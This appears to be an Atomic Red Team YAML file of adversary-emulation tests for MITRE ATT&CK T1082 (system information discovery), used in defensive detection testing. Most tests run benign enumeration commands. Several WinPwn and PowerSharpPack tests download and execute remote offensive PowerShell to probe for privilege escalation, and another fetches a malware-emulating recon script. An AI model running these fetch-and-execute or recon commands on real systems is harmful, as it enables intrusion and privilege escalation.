attack_technique: T1082
display_name: System Information Discovery
atomic_tests:
    - name: System Information Discovery
      item_id: T1082-1
      auto_generated_guid: 66703791-c902-4560-8770-42b8a91f7667
      description: |
        Identify System Info. Upon execution, system info and time info will be displayed.
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            systeminfo
            reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
        cleanup_command: ""
        name: command_prompt
        elevation_required: false
    - name: System Information Discovery
      item_id: T1082-2
      auto_generated_guid: edff98ec-0f73-4f63-9890-6b117092aff6
      description: |
        Identify System Info
      supported_platforms:
        - macos
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            system_profiler
            ls -al /Applications
        cleanup_command: ""
        name: sh
        elevation_required: false
    - name: List OS Information
      item_id: T1082-3
      auto_generated_guid: cccb070c-df86-4216-a5bc-9fb60c74e27c
      description: |
        Identify System Info
      supported_platforms:
        - linux
        - macos
      input_arguments:
        output_file:
            description: Output file used to store the results.
            type: path
            default: /tmp/AtomicPathFolder/program/T1082.txt
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: "uname -a >> #{output_file}\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   \nif [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi\nuptime >> #{output_file}\ncat #{output_file} 2>/dev/null\n"
        cleanup_command: |
            rm #{output_file} 2>/dev/null
        name: sh
        elevation_required: false
    - name: Linux VM Check via Hardware
      item_id: T1082-4
      auto_generated_guid: 31dad7ad-2286-4c02-ae92-274418c85fec
      description: |
        Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.
      supported_platforms:
        - linux
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi
            if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi
            if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi
            if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"; fi
            if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox"; fi
            if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"; fi
            if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i "vmware\|virtualbox"; fi
            if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i "Xen\|KVM\|Microsoft"; fi
        cleanup_command: ""
        name: bash
        elevation_required: false
    - name: Linux VM Check via Kernel Modules
      item_id: T1082-5
      auto_generated_guid: 8057d484-0fae-49a4-8302-4812c4f1e64e
      description: |
        Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.
      supported_platforms:
        - linux
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            sudo lsmod | grep -i "vboxsf\|vboxguest"
            sudo lsmod | grep -i "vmw_baloon\|vmxnet"
            sudo lsmod | grep -i "xen-vbd\|xen-vnif"
            sudo lsmod | grep -i "virtio_pci\|virtio_net"
            sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
        cleanup_command: ""
        name: bash
        elevation_required: false
    - name: Hostname Discovery (Windows)
      item_id: T1082-6
      auto_generated_guid: 85cfbf23-4a1e-4342-8792-007e004b975f
      description: |
        Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            hostname
        cleanup_command: ""
        name: command_prompt
        elevation_required: false
    - name: Hostname Discovery
      item_id: T1082-7
      auto_generated_guid: 486e88ea-4f56-470f-9b57-3f4d73f39133
      description: |
        Identify system hostname for Linux and macOS systems.
      supported_platforms:
        - linux
        - macos
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            hostname
        cleanup_command: ""
        name: bash
        elevation_required: false
    - name: Windows MachineGUID Discovery
      item_id: T1082-8
      auto_generated_guid: 224b4daf-db44-404e-b6b2-f4d1f0126ef8
      description: |
        Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
        cleanup_command: ""
        name: command_prompt
        elevation_required: false
    - name: Griffon Recon
      item_id: T1082-9
      auto_generated_guid: 69bd4abe-8759-49a6-8d21-0f15822d6370
      description: "This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)"
      supported_platforms:
        - windows
      input_arguments:
        vbscript:
            description: Path to sample script
            type: string
            default: PathToAtomicsFolder\T1082\src\griffon_recon.vbs
      dependency_executor_name: powershell
      dependencies:
        - description: |
            Sample script file must exist on disk at specified location (#{vbscript})
          prereq_command: |
            if (Test-Path #{vbscript}) {exit 0} else {exit 1}
          get_prereq_command: |
            New-Item -Type Directory (split-path #{vbscript}) -ErrorAction ignore | Out-Null
            Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs" -OutFile "#{vbscript}"
      executor:
        command: 'cscript #{vbscript}'
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: Environment variables discovery on windows
      item_id: T1082-10
      auto_generated_guid: f400d1c0-1804-4ff8-b069-ef5ddd2adbf3
      description: |
        Identify all environment variables. Upon execution, environments variables and your path info will be displayed.
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            set
        cleanup_command: ""
        name: command_prompt
        elevation_required: false
    - name: Environment variables discovery on macos and linux
      item_id: T1082-11
      auto_generated_guid: fcbdd43f-f4ad-42d5-98f3-0218097e2720
      description: |
        Identify all environment variables. Upon execution, environments variables and your path info will be displayed.
      supported_platforms:
        - macos
        - linux
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            env
        cleanup_command: ""
        name: sh
        elevation_required: false
    - name: Show System Integrity Protection status (MacOS)
      item_id: T1082-12
      auto_generated_guid: 327cc050-9e99-4c8e-99b5-1d15f2fb6b96
      description: |
        Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.
      supported_platforms:
        - macos
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            csrutil status
        cleanup_command: ""
        name: sh
        elevation_required: false
    - name: WinPwn - winPEAS
      item_id: T1082-13
      auto_generated_guid: eea1d918-825e-47dd-acc2-814d6c58c0e1
      description: Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
            winPEAS -noninteractive -consoleoutput
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: WinPwn - itm4nprivesc
      item_id: T1082-14
      auto_generated_guid: 3d256a2f-5e57-4003-8eb6-64d91b1da7ce
      description: Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
            itm4nprivesc -noninteractive -consoleoutput
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: WinPwn - Powersploits privesc checks
      item_id: T1082-15
      auto_generated_guid: 345cb8e4-d2de-4011-a580-619cf5a9e2d7
      description: Powersploits privesc checks using oldchecks function of WinPwn
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
            oldchecks -noninteractive -consoleoutput
        cleanup_command: |-
            rm -force -recurse .\DomainRecon -ErrorAction Ignore
            rm -force -recurse .\Exploitation -ErrorAction Ignore
            rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
            rm -force -recurse .\LocalRecon -ErrorAction Ignore
            rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
        name: powershell
        elevation_required: false
    - name: WinPwn - General privesc checks
      item_id: T1082-16
      auto_generated_guid: 5b6f39a2-6ec7-4783-a5fd-2c54a55409ed
      description: General privesc checks using the otherchecks function of WinPwn
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
            otherchecks -noninteractive -consoleoutput
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: WinPwn - GeneralRecon
      item_id: T1082-17
      auto_generated_guid: 7804659b-fdbf-4cf6-b06a-c03e758590e8
      description: Collect general computer informations via GeneralRecon function of WinPwn
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
            Generalrecon -consoleoutput -noninteractive
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: WinPwn - Morerecon
      item_id: T1082-18
      auto_generated_guid: 3278b2f6-f733-4875-9ef4-bfed34244f0a
      description: Gathers local system information using the Morerecon function of WinPwn
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
            Morerecon -noninteractive -consoleoutput
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: WinPwn - RBCD-Check
      item_id: T1082-19
      auto_generated_guid: dec6a0d8-bcaf-4c22-9d48-2aee59fb692b
      description: Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
            RBCD-Check -consoleoutput -noninteractive
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: WinPwn - PowerSharpPack - Watson searching for missing windows patches
      item_id: T1082-20
      auto_generated_guid: 07b18a66-6304-47d2-bad0-ef421eb2e107
      description: PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
            Invoke-watson
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors
      item_id: T1082-21
      auto_generated_guid: efb79454-1101-4224-a4d0-30c9c8b29ffc
      description: PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
            Invoke-SharpUp -command "audit"
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: WinPwn - PowerSharpPack - Seatbelt
      item_id: T1082-22
      auto_generated_guid: 5c16ceb4-ba3a-43d7-b848-a13c1f216d95
      description: |-
        PowerSharpPack - Seatbelt technique via function of WinPwn.

        [Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
            Invoke-Seatbelt -Command "-group=all"; pause
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: Azure Security Scan with SkyArk
      item_id: T1082-23
      auto_generated_guid: 26a18d3d-f8bc-486b-9a33-d6df5d78a594
      description: "Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. \nOnce the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. \nSee https://github.com/cyberark/SkyArk \n"
      supported_platforms:
        - azure-ad
      input_arguments:
        password:
            description: Azure AD password
            type: string
            default: T1082Az
        username:
            description: Azure AD username
            type: string
            default: ""
      dependency_executor_name: powershell
      dependencies:
        - description: |
            The SkyArk AzureStealth module must exist in $env:temp.
          prereq_command: |
            if (test-path $env:temp\AzureStealth.ps1){exit 0} else {exit 1}
          get_prereq_command: |
            invoke-webrequest "https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1" -outfile "$env:temp\AzureStealth.ps1"
        - description: |
            The AzureAD module must be installed.
          prereq_command: |
            try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
          get_prereq_command: |
            Install-Module -Name AzureAD -Force
        - description: |
            The Az module must be installed.
          prereq_command: |
            try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
          get_prereq_command: |
            Install-Module -Name Az -Force
      executor:
        command: "Import-Module $env:temp\\AzureStealth.ps1 -force      \n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzAccount -Credential $Credential\nConnect-AzureAD -Credential $Credential\nScan-AzureAdmins -UseCurrentCred\n"
        cleanup_command: |
            $resultstime = Get-Date -Format "yyyyMMdd"
            $resultsfolder = ("Results-" + $resultstime)
            remove-item $env:temp\$resultsfolder -recurse -force -erroraction silentlycontinue
        name: powershell
        elevation_required: true
    - name: Linux List Kernel Modules
      item_id: T1082-24
      auto_generated_guid: 034fe21c-3186-49dd-8d5d-128b35f181c7
      description: |
        Enumerate kernel modules installed 3 different ways. Upon successful execution stdout will display kernel modules installed on host 2 times, followed by list of modules matching 'vmw' if present.
      supported_platforms:
        - linux
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            lsmod
            kmod list
            grep vmw /proc/modules
        cleanup_command: ""
        name: sh
        elevation_required: false
    - name: System Information Discovery with WMIC
      item_id: T1082-25
      auto_generated_guid: 8851b73a-3624-4bf7-8704-aa312411565c
      description: |
        Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.
        https://nwgat.ninja/getting-system-information-with-wmic-on-windows/
        Elements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:
        https://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar
        https://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            wmic cpu get name
            wmic MEMPHYSICAL get MaxCapacity
            wmic baseboard get product
            wmic baseboard get version
            wmic bios get SMBIOSBIOSVersion
            wmic path win32_VideoController get name
            wmic path win32_VideoController get DriverVersion
            wmic path win32_VideoController get VideoModeDescription
            wmic OS get Caption,OSArchitecture,Version
            wmic DISKDRIVE get Caption
        cleanup_command: ""
        name: command_prompt
        elevation_required: false
